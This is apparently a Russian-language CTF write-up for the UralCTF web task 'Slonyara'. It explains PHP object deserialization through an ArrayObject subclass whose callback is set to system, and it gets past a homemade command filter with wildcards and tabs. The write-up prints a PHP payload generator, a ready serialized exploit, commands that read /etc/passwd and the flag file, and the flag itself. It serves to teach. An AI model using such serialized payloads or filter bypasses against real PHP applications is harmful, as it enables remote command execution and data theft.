# Slonyara | easy | web

## Информация

> Решил выгулять старого доброго слоняру, погляди что из этого вышло.
> http://5.1.53.43:5059

## Описание

Таск на PHP-десериализацию + обходом фильтров на OS command injection. Предполагаемое решение - использование функций PHP для исполнения
произвольного кода на сервере с последующим обходом самописного WAF

## Решение

1. Изначально был дан скрин с классом ExtraArray, в котором переопределяется метод offsetGet
от родительского класса ArrayObject. Если погуглить, то можно прочитать, что данный метод вызывается всякий раз,
когда идет обращение к элементу по его индексу. Также внутри данного метода можно заметить переменную
$help, на которую нет ссылок и которая нигде не вызывается. Тем не менее, она инициализируется значением
выполнения функции `call_user_func`, где к элементу массива $value применяется функция $callback, которая
является одним из полей нашего класса ExtraArray.

2. По логике автора, эксплуатация данной уязвимости должна была производиться через PHP-функции типа system, exec,
shell_exec и прочими (о чем, кстати, был дан хинт), которые дадут возможность выполнения произвольного кода
на сервере и, как следствие, чтения флага. Но были и нюансы - например, большинство системных команд linux
были в бане, о чем могла свидетельствовать надпись `Not so easy, my honey :)`. Помимо этого, было запрещено
использование пробелов, а также было условие на обязательное наличие символов типа `*` или `?` в готовом эксплойте.
По логике автора таска, при гуглинге возможностей обхода фильтров участники так или иначе должны были прочитать
о возможности использования символов подстановки для выполнения linux-команд. Например, прочитать файл
`/etc/passwd` командой `cat` можно так:
```
ca? /etc/passwd
```
Но и тут есть нюанс. Для того, чтобы символы подстановки корректно работали внутри PHP функций типа system, exec
и прочих, нужно указывать полный путь до исполняемого файла. Как правило, исполняемые файлы в linux лежат в
`/usr/bin/`, поэтому внутри эксплойта нужно было указывать команды формата
```
/usr/bin/ca? /etc/passwd
```

3. Название флага имело формат `{random_symbols}flag.txt`, флаг лежал в директории веб-сервера.

4. Итак, пишем PHP-код для эксплойта (будет сразу рабочий вариант):
```php
<?php
use ArrayObject;

class ExtraArray extends ArrayObject
{
    public $callback;

    #[\ReturnTypeWillChange] // не обязательно
    public function offsetGet($index)
    {
        $value = parent::offsetGet($index);
        $help = call_user_func($this->callback, $value);
        return $value;
    }
}

$array = new ExtraArray(['/usr/bin/ca?	*flag.txt']);

$array->callback = 'system';

$serialized = serialize($array);
echo $serialized;

```

5. Ну и сам эксплойт:
```
O:10:"ExtraArray":4:{i:0;i:0;i:1;a:1:{i:0;s:22:"/usr/bin/ca?	*flag.txt";}i:2;a:1:{s:8:"callback";s:6:"system";}i:3;N;}
```

6. P.S. Для листинга содержимого текущей директории можно было использовать команду `/usr/bin/ech?	*`

## Флаг

`UralCTF{php_d3ser1alizat10n_wi7h_s0m3_f6n}`

